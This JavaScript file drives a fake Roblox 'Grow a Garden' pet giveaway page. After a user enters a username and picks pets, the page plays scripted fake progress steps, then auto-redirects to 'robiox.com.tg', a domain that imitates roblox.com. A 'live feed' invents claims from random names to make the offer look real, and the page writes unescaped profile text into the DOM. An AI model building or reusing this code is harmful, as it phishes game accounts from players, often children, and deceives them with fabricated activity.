// ----------------- Pet List -----------------
const pets = [
  { id: 0, name: 'T-Rex', rarity: 'Legendary', image: 'tr.png', qty: 0 },
  { id: 1, name: 'Raccoon', rarity: 'Rare', image: 'rc.png', qty: 0 },
  { id: 2, name: 'Fennec Fox', rarity: 'Epic', image: 'ff.png', qty: 0 },
  { id: 3, name: 'Kitsune', rarity: 'Legendary', image: 'kit.png', qty: 0 },
  { id: 4, name: 'Red Dragon', rarity: 'Legendary', image: 'rd.png', qty: 0 },
  { id: 5, name: 'Mimic Octopus', rarity: 'Epic', image: 'mo.png', qty: 0 },
  { id: 6, name: 'Disco Bee', rarity: 'Epic', image: 'db.gif', qty: 0 },
  { id: 7, name: 'Queen Bee', rarity: 'Legendary', image: 'qb.png', qty: 0 }
];

let username = "";
let selected = [];

// ----------------- Render Pets -----------------
function renderPets() {
  const grid = document.getElementById('petGrid');
  grid.innerHTML = '';
  pets.forEach(p => {
    const card = document.createElement('div');
    card.className = 'card';
    card.innerHTML = `
      <div class="thumb"><img src="${p.image}" alt="${p.name}"></div>
      <div class="name">${p.name}</div>
      <div class="rarity">${p.rarity}</div>
      <div class="quantity">
        <button class="qty-btn" onclick="decrease(${p.id})">-</button>
        <span id="qty-${p.id}">${p.qty}</span>
        <button class="qty-btn" onclick="increase(${p.id})">+</button>
      </div>
    `;
    grid.appendChild(card);
  });
}

// ----------------- Increase/Decrease -----------------
function increase(id) {
  const pet = pets.find(p => p.id === id);
  pet.qty++;
  update();
}
function decrease(id) {
  const pet = pets.find(p => p.id === id);
  if (pet.qty > 0) pet.qty--;
  update();
}

// ----------------- Update UI -----------------
function update() {
  const list = document.getElementById('selectedList');
  list.innerHTML = '';

  selected = pets.filter(p => p.qty > 0);

  if (selected.length === 0) {
    list.innerHTML = '<li>—</li>';
  } else {
    selected.forEach(p => {
      const li = document.createElement('li');
      li.textContent = `${p.name} x${p.qty}`;
      list.appendChild(li);
    });
  }

  pets.forEach(p => {
    const el = document.getElementById(`qty-${p.id}`);
    if (el) el.textContent = p.qty;
  });

  document.getElementById('selectedCount').textContent = selected.reduce((sum, p) => sum + p.qty, 0);

  const btn = document.getElementById('claimBtn');
  if (selected.length > 0 && username) {
    btn.disabled = false;
    btn.textContent = `Claim Selected (${selected.reduce((sum, p) => sum + p.qty, 0)})`;
  } else {
    btn.disabled = true;
    btn.textContent = `Claim Selected (0)`;
  }
}

// ----------------- Roblox Lookup (via Vercel API) -----------------
async function lookupRobloxUser(usernameToLookup) {
  const info = document.getElementById('accountInfo');
  info.innerHTML = `<div class="account-searching">Searching for <b>@${usernameToLookup}</b>...</div>`;

  try {
    // Call your Vercel API route
    const res = await fetch(`/api/roblox?username=${encodeURIComponent(usernameToLookup)}`);
    const userData = await res.json();

    if (!res.ok || userData.error) {
      info.innerHTML = `<div class="account-error">❌ ${userData.error || "Account not found"}</div>`;
      username = "";
      update();
      return;
    }

    const name = userData.name;
    const displayName = userData.displayName || name;
    const created = userData.created ? new Date(userData.created).toLocaleDateString() : "Unknown";
    const description = userData.description || "No description";
    const userId = userData.id;

    const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`;

    info.innerHTML = `
      <div class="account-card">
        <img src="${avatarUrl}" class="ac-avatar">
        <div class="ac-body">
          <div class="ac-name">${displayName} <span class="muted">@${name}</span></div>
          <div class="ac-meta">User ID: <b>${userId}</b></div>
          <div class="ac-meta">Joined: <b>${created}</b> 
            <a href="https://www.roblox.com/users/${userId}/profile" target="_blank">Open</a>
          </div>
          <div class="ac-desc">${description}</div>
        </div>
      </div>
    `;

    username = name;
    update();

  } catch (err) {
    console.error("Roblox lookup error:", err);
    info.innerHTML = `<div class="account-error">❌ Failed to fetch account</div>`;
    username = "";
    update();
  }
}

// ----------------- Save Username -----------------
document.getElementById('saveBtn').addEventListener('click', () => {
  const input = document.getElementById('username');
  const raw = input.value.trim();
  const info = document.getElementById('accountInfo');

  const validPattern = /^[a-zA-Z0-9_]{3,20}$/;
  if (!raw.match(validPattern)) {
    info.innerHTML = `<div class="account-error">❌ Invalid username. Use 3–20 letters, numbers or underscores.</div>`;
    username = "";
    update();
    return;
  }

  lookupRobloxUser(raw);
});

// ----------------- Modal -----------------
const modal = document.getElementById("modal");
const modalContent = document.getElementById("modalContent");

function showModal(html) {
  modalContent.innerHTML = html;
  modal.classList.remove("hidden");
}
function closeModal() {
  modal.classList.add("hidden");
}

// ----------------- Claim Flow -----------------
document.getElementById('claimBtn').addEventListener('click', () => {
  if (!username || selected.length === 0) return;

  const selectionText = selected.map(p => `${p.name} x${p.qty}`).join("<br>");
  showModal(`
    <h3>Confirm Selection</h3>
    <p>Roblox Username: <b>@${username}</b></p>
    <div class="confirm-items">${selectionText}</div>
    <div style="display:flex;gap:8px;margin-top:12px;">
      <button class="btn" onclick="startProcessing()">Confirm</button>
      <button class="btn outlined" onclick="closeModal()">Cancel</button>
    </div>
  `);
});

// ----------------- Processing + Redirect -----------------
window.startProcessing = function() {
  const steps = ["Connecting to account...", "Encrypting item transfer...", "Finalizing confirmation..."];
  let currentStep = 0;

  showModal(`<h3>Processing your claim</h3>
    <div id="steps"></div>
    <div class="progress-wrap"><div id="progressBar" class="progress-bar"></div></div>
  `);

  const progressBar = document.getElementById('progressBar');

  function nextStep() {
    const stepsDiv = document.getElementById("steps");
    const p = document.createElement("p");
    p.textContent = steps[currentStep];
    stepsDiv.appendChild(p);

    setTimeout(() => {
      p.textContent = steps[currentStep] + " ✅";
      currentStep++;
      progressBar.style.width = (currentStep / steps.length * 100) + '%';

      if (currentStep < steps.length) {
        setTimeout(nextStep, 700);
      } else {
        setTimeout(() => {
          let countdown = 5;
          const redirectUrl = "https://www.robiox.com.tg/games/126884695634066/Grow-a-Garden?privateServerLinkCode=983286587985765853686787059868"; // your link
          pushClaimToFeed(username, selected);
          showModal(`
            <h3>Ready to Claim</h3>
            <p>Join the private server and find <b>Host</b> in the spawn area to complete your claim.</p>
            <p id="countdown">Redirecting in ${countdown} seconds...</p>
            <div style="display:flex;gap:8px;margin-top:12px;">
              <button class="btn" id="joinNowBtn">Join Now</button>
              <button class="btn outlined" onclick="closeModal()">Cancel</button>
            </div>
          `);

          document.getElementById('joinNowBtn').addEventListener('click', () => window.location.href = redirectUrl);

          const interval = setInterval(() => {
            countdown--;
            document.getElementById("countdown").textContent = `Redirecting in ${countdown} seconds...`;
            if (countdown <= 0) {
              clearInterval(interval);
              window.location.href = redirectUrl;
            }
          }, 1000);
        }, 700);
      }
    }, 900);
  }

  nextStep();
};

// ----------------- Live Feed -----------------
const names = ["NoobSlayer", "EpicGamer", "PetMaster", "ProBuilder", "Guest123", "PixelKing", "QueenBee"];
const actions = ["claimed", "won", "received", "obtained", "unlocked"];

function randomLiveActivity() {
  const feed = document.getElementById("liveFeed");
  if (!feed) return;

  const user = names[Math.floor(Math.random() * names.length)];
  const action = actions[Math.floor(Math.random() * actions.length)];
  const pet = pets[Math.floor(Math.random() * pets.length)];

  const p = document.createElement("p");
  p.textContent = `${user} ${action} ${pet.name} x1`;
  feed.prepend(p);

  while (feed.childNodes.length > 10) {
    feed.removeChild(feed.lastChild);
  }
}
setInterval(randomLiveActivity, 3000);

// Push real claims into feed
function pushClaimToFeed(user, selection) {
  const feed = document.getElementById("liveFeed");
  if (!feed) return;

  const p = document.createElement("p");
  p.textContent = `${user} claimed ${selection.map(p => p.name + ' x' + p.qty).join(', ')}`;
  feed.prepend(p);

  while (feed.childNodes.length > 10) {
    feed.removeChild(feed.lastChild);
  }
}

// ----------------- Init -----------------
renderPets();
update();
    
